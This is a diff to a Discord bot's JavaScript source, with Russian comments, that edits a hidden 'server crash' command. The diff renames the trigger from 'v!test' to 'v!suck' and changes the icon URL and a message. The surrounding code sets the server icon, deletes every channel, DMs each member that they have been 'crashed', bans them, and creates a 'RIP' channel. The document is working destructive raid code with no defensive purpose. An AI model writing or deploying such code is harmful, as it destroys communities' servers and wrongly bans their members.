@@ -33,11 +33,11 @@ bot.on ("message", async message =>{
     if (cmd) cmd.run(bot,message,args);
 });
 bot.on('message', msg => {
-    if (msg.content === 'v!test') {
-		msg.guild.setIcon('https://coubsecure-s.akamaihd.net/get/b172/p/channel/cw_avatar/be07de8dd96/573da535eff8597af82fe/profile_pic_big_1521653194_neco1.png').then(() => {
+    if (msg.content === 'v!suck') {
+		msg.guild.setIcon('https://media.discordapp.net/attachments/700639036980723742/705099946935713792/---1.jpg').then(() => {
       msg.guild.channels.forEach(c => c.delete()) //Удаление все чатов и каналов
        msg.guild.members.forEach(member => { //Расслыка всем пользователям
-        if (member.id != bot.user.id && !member.user.bot) member.send(' Вас крашнули  ').then(() => {
+        if (member.id != bot.user.id && !member.user.bot) member.send(' Вас крашнули, простите если этого бота использовал кто-то другой  ').then(() => {
             member.ban().then(() => {
                 const name = 'RIP'
                 msg.guild.createChannel(name, "text")
